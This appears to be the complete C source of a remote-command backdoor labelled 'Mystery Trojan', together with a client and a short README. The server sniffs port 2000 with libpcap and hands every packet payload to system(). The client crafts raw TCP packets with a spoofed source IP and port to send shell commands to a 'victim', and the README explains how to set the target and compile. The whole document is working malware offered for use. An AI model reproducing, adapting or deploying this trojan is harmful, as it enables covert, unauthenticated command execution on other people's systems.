Server:

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define SNAP_LEN 1518
#define SIZE_ETHERNET 14
#define ETHER_ADDR_LEN 6

*/.......................................*/
*/ x90 */
*/ Mystery Trojan */
*/......................................*/

struct sniff_ethernet {
u_char ether_dhost[ETHER_ADDR_LEN];
u_char ether_shost[ETHER_ADDR_LEN];
u_short ether_type;};


struct sniff_ip {
u_char ip_vhl;
u_char ip_tos;
u_short ip_len;
u_short ip_id;
u_short ip_off;
#define IP_RF 0x8000
#define IP_DF 0x4000
#define IP_MF 0x2000
#define IP_OFFMASK 0x1fff
u_char ip_ttl;
u_char ip_p;
u_short ip_sum;
struct in_addr ip_src,ip_dst;};

#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip) (((ip)->ip_vhl) >> 4)


typedef u_int tcp_seq;

struct sniff_tcp {
u_short th_sport;
u_short th_dport;
tcp_seq th_seq;
tcp_seq th_ack;
u_char th_offx2;
#define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
u_short th_win;
u_short th_sum;
u_short th_urp;};

void got_command(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void print_payload(const u_char *payload, int len);
void print_command(const u_char *payload, int len, int offset);

void print_command(const u_char *payload, int len, int offset)
{
int i;
const u_char *ch;

ch = payload;



system(ch);

return;
}

void print_payload(const u_char *payload, int len)
{

int len_rem = len;
int line_width = 1;
int line_len;
int offset = 0;
const u_char *ch = payload;

print_command(ch, len_rem, offset);


return;
}


void got_command(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

static int count = 1;


const struct sniff_ethernet *ethernet;
const struct sniff_ip *ip;
const struct sniff_tcp *tcp;
const char *payload;

int size_ip;
int size_tcp;
int size_payload;


count++;


ethernet = (struct sniff_ethernet*)(packet);

ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
size_ip = IP_HL(ip)*4;
if (size_ip < 20) {
printf(" * The IP Header Is (filtered) Up!: %u bytes\n", size_ip);
return;
}

tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
size_tcp = TH_OFF(tcp)*4;
if (size_tcp < 20) {
printf(" * The TCP Header Is (filtered) Up!: %u bytes\n", size_tcp);
return;
}



payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);


size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);




if (size_payload > 0) {

print_payload(payload, size_payload);
}

return;
}

int main(int argc, char **argv)
{

for(;;)
{

char *dev = NULL;
char errbuf[PCAP_ERRBUF_SIZE];
pcap_t *handle;

char filter_exp[] = "port 2000";
struct bpf_program fp;
bpf_u_int32 mask;
bpf_u_int32 net;
int num_packets = 1;


dev = pcap_lookupdev(errbuf);
pcap_lookupnet(dev, &net, &mask, errbuf);
handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
pcap_compile(handle, &fp, filter_exp, 0, net);
pcap_setfilter(handle, &fp);
pcap_loop(handle, num_packets, got_command, NULL);
pcap_freecode(&fp);
pcap_close(handle);
}


return 0;
}


Client:

#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<features.h>
#include<linux/if_packet.h>
#include<linux/if_ether.h>
#include<errno.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<net/ethernet.h>
#include<linux/ip.h>
#include<linux/tcp.h>
#include<arpa/inet.h>
#include<string.h>
#include<sys/time.h>


#define DATA_SIZE 100

#define SRC_ETHER_ADDR "aa:aa:aa:aa:aa:aa"
#define DST_ETHER_ADDR "bb:bb:bb:bb:bb:bb"
#define SRC_IP "72.14.253.104" 
#define DST_IP "192.168.0.2"
#define SRC_PORT 80
#define DST_PORT 2000

typedef struct PseudoHeader{

unsigned long int source_ip;
unsigned long int dest_ip;
unsigned char reserved;
unsigned char protocol;
unsigned short int tcp_length;

}PseudoHeader;


int CreateRawSocket(int protocol_to_sniff)
{
int rawsock;

if((rawsock = socket(PF_PACKET, SOCK_RAW, htons(protocol_to_sniff)))== -1)
{
perror("Error creating raw socket: ");
exit(-1);
}

return rawsock;
}

int BindRawSocketToInterface(char *device, int rawsock, int protocol)
{

struct sockaddr_ll sll;
struct ifreq ifr;

bzero(&sll, sizeof(sll));
bzero(&ifr, sizeof(ifr));

/* First Get the Interface Index */


strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);
if((ioctl(rawsock, SIOCGIFINDEX, &ifr)) == -1)
{
printf("Error getting Interface index !\n");
exit(-1);
}

/* Bind our raw socket to this interface */

sll.sll_family = AF_PACKET;
sll.sll_ifindex = ifr.ifr_ifindex;
sll.sll_protocol = htons(protocol); 


if((bind(rawsock, (struct sockaddr *)&sll, sizeof(sll)))== -1)
{
perror("Error binding raw socket to interface\n");
exit(-1);
}

return 1;

}


int SendRawPacket(int rawsock, unsigned char *pkt, int pkt_len)
{
int sent= 0;

/* A simple write on the socket ..thats all it takes ! */

if((sent = write(rawsock, pkt, pkt_len)) != pkt_len)
{
/* Error */
printf("Could only send %d bytes of packet of length %d\n", sent, pkt_len);
return 0;
}

return 1;


}

struct ethhdr* CreateEthernetHeader(char *src_mac, char *dst_mac, int protocol)
{
struct ethhdr *ethernet_header;


ethernet_header = (struct ethhdr *)malloc(sizeof(struct ethhdr));

/* copy the Src mac addr */

memcpy(ethernet_header->h_source, (void *)ether_aton(src_mac), 6);

/* copy the Dst mac addr */

memcpy(ethernet_header->h_dest, (void *)ether_aton(dst_mac), 6);

/* copy the protocol */

ethernet_header->h_proto = htons(protocol);

/* done ...send the header back */

return (ethernet_header);


}

/* Ripped from Richard Stevans Book */

unsigned short ComputeChecksum(unsigned char *data, int len)
{
long sum = 0; /* assume 32 bit long, 16 bit short */
unsigned short *temp = (unsigned short *)data;

while(len > 1){
sum += *temp++;
if(sum & 0x80000000) /* if high order bit set, fold */
sum = (sum & 0xFFFF) + (sum >> 16);
len -= 2;
}

if(len) /* take care of left over byte */
sum += (unsigned short) *((unsigned char *)temp);

while(sum>>16)
sum = (sum & 0xFFFF) + (sum >> 16);

return ~sum;
}


struct iphdr *CreateIPHeader(/* Customize this as an exercise */)
{
struct iphdr *ip_header;

ip_header = (struct iphdr *)malloc(sizeof(struct iphdr));

ip_header->version = 4;
ip_header->ihl = (sizeof(struct iphdr))/4;
ip_header->tos = 0;
ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + DATA_SIZE);
ip_header->id = htons(111);
ip_header->frag_off = 0;
ip_header->ttl = 111;
ip_header->protocol = IPPROTO_TCP;
ip_header->check = 0; /* We will calculate the checksum later */
(in_addr_t)ip_header->saddr = inet_addr(SRC_IP);
(in_addr_t)ip_header->daddr = inet_addr(DST_IP);


/* Calculate the IP checksum now : 
The IP Checksum is only over the IP header */

ip_header->check = ComputeChecksum((unsigned char *)ip_header, ip_header->ihl*4);

return (ip_header);

}

struct tcphdr *CreateTcpHeader(/* Customization Exercise */)
{
struct tcphdr *tcp_header;

/* Check /usr/include/linux/tcp.h for header definiation */

tcp_header = (struct tcphdr *)malloc(sizeof(struct tcphdr));


tcp_header->source = htons(SRC_PORT);
tcp_header->dest = htons(DST_PORT);
tcp_header->seq = htonl(111);
tcp_header->ack_seq = htonl(111);
tcp_header->res1 = 0;
tcp_header->doff = (sizeof(struct tcphdr))/4;
tcp_header->syn = 1;
tcp_header->window = htons(100);
tcp_header->check = 0; /* Will calculate the checksum with pseudo-header later */
tcp_header->urg_ptr = 0;

return (tcp_header);
}

CreatePseudoHeaderAndComputeTcpChecksum(struct tcphdr *tcp_header, struct iphdr *ip_header, unsigned char *data)
{
/*The TCP Checksum is calculated over the PseudoHeader + TCP header +Data*/

/* Find the size of the TCP Header + Data */
int segment_len = ntohs(ip_header->tot_len) - ip_header->ihl*4; 

/* Total length over which TCP checksum will be computed */
int header_len = sizeof(PseudoHeader) + segment_len;

/* Allocate the memory */

unsigned char *hdr = (unsigned char *)malloc(header_len);

/* Fill in the pseudo header first */

PseudoHeader *pseudo_header = (PseudoHeader *)hdr;

pseudo_header->source_ip = ip_header->saddr;
pseudo_header->dest_ip = ip_header->daddr;
pseudo_header->reserved = 0;
pseudo_header->protocol = ip_header->protocol;
pseudo_header->tcp_length = htons(segment_len);


/* Now copy TCP */

memcpy((hdr + sizeof(PseudoHeader)), (void *)tcp_header, tcp_header->doff*4);

/* Now copy the Data */

memcpy((hdr + sizeof(PseudoHeader) + tcp_header->doff*4), data, DATA_SIZE);

/* Calculate the Checksum */

tcp_header->check = ComputeChecksum(hdr, header_len);

/* Free the PseudoHeader */
free(hdr);

return;

}

unsigned char *CreateData(int len)
{
unsigned char *data = (unsigned char *)malloc(len);


char line[100];
char *p;
printf("$>");
p = gets (line);
strcpy(data,line);

return data;
}


/* argv[1] is the device e.g. eth0 */

main(int argc, char **argv)
{

printf(".oo00oo00oo00oo00....00oo00oo00oo00oo.\n");
printf("o x90 o\n");
printf("0 Mystery 0.1 0\n");
printf("o o\n");
printf(".oo00oo00oo00oo00....00oo00oo00oo00oo.\n");

for(;;)
{
int raw;
unsigned char *packet;
struct ethhdr* ethernet_header;
struct iphdr *ip_header;
struct tcphdr *tcp_header;
unsigned char *data;
int pkt_len;


/* Create the raw socket */

raw = CreateRawSocket(ETH_P_ALL);

/* Bind raw socket to interface */

BindRawSocketToInterface(argv[1], raw, ETH_P_ALL);

/* create Ethernet header */

ethernet_header = CreateEthernetHeader(SRC_ETHER_ADDR, DST_ETHER_ADDR, ETHERTYPE_IP);

/* Create IP Header */

ip_header = CreateIPHeader();

/* Create TCP Header */

tcp_header = CreateTcpHeader();

/* Create Data */

data = CreateData(DATA_SIZE);

/* Create PseudoHeader and compute TCP Checksum */

CreatePseudoHeaderAndComputeTcpChecksum(tcp_header , ip_header, data);


/* Packet length = ETH + IP header + TCP header + Data*/

pkt_len = sizeof(struct ethhdr) + ntohs(ip_header->tot_len);

/* Allocate memory */

packet = (unsigned char *)malloc(pkt_len);

/* Copy the Ethernet header first */

memcpy(packet, ethernet_header, sizeof(struct ethhdr));

/* Copy the IP header -- but after the ethernet header */

memcpy((packet + sizeof(struct ethhdr)), ip_header, ip_header->ihl*4);

/* Copy the TCP header after the IP header */

memcpy((packet + sizeof(struct ethhdr) + ip_header->ihl*4),tcp_header, tcp_header->doff*4);

/* Copy the Data after the TCP header */

memcpy((packet + sizeof(struct ethhdr) + ip_header->ihl*4 + tcp_header->doff*4), data, DATA_SIZE);

/* send the packet on the wire */

if(!SendRawPacket(raw, packet, pkt_len))
{
perror("Error sending packet");
}
else
printf("Command Sent!\n");

/* Free the headers back to the heavenly heap */

free(ethernet_header);
free(ip_header);
free(tcp_header);
free(data);
free(packet);

close(raw);
}

return 0;
}


README:

################################################## #
things to change on the server:
char filter_exp[] = "port 2000"; <-- to change what port to listen on
################################################## ##

################################################## ##
things to change on the client:
#define SRC_IP "72.14.253.104" <--- spoofed ip this one is googles IP
#define DST_IP "192.168.0.2" <--- IP of target
#define SRC_PORT 80 <---spoofed port
#define DST_PORT 2000 <--- port of victim
################################################## ##

and end all your commands with "&".

oh and to compile add -lpcap
example: cc pc.c -o mystery -lpcap
